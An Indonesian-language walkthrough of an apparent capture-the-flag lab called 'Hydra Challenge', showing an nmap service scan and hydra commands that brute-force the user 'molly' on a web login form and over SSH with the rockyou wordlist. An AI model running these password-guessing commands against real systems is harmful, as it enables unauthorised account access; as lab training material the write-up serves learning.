lakukan enumerating scan pada target dengan nmap

```
nmap -sC -sV IP-target
...
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:              
|   2048 34:d2:f6:c1:e7:db:68:7e:c9:15:f4:28:43:c8:95:7b (RSA)    
|   256 0e:c3:5b:e1:00:60:13:ed:b5:92:40:cc:88:3d:d7:6c (ECDSA)
|_  256 ea:c8:17:04:e2:65:6a:4d:d3:70:d9:bb:7b:65:58:94 (ED25519)
80/tcp open  http    Node.js Express framework                
| http-title: Hydra Challenge                                     
|_Requested resource was /login                                   
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

`IP-target:80` akan memberikan login page jika dibuka di browser. Kita bruteforce dengan hydra, dengan target username `molly`.

Pertama kita perlu mengambil request form dari login page, buka inspect element, lalu masuk ke tab `network`. Masukkan creds user:pass sembarang pada login form, dan nantinya page akan refresh dan tab network akan berisi beberapa aktivitas, hal ini hanya digunakan untuk mengambil request body. Selanjutnya di tab network pilih aktifitas dengan POST method, lalu klik tombol Resend pada bagian kanan dan akan muncul tab baru pada inspect element, lalu cari request body, dan copy isinya.

Selanjutnya buat command untuk bruteforce dengan hydra.
```
hydra -l molly -P /path/to/rockyou.txt IP-target http-form-post "/login:username=^USER^&password=^PASS^:incorrect"
```

nantinya akan keluar creds untuk web login. Sedangkan untuk ssh, lebih simple

```
hydra -l molly -P /path/to/rockyou.txt IP-target -s 22 ssh
```

dan nantinya akan keluar creds untuk ssh login

```
ssh molly@IP-target
password: ---
```
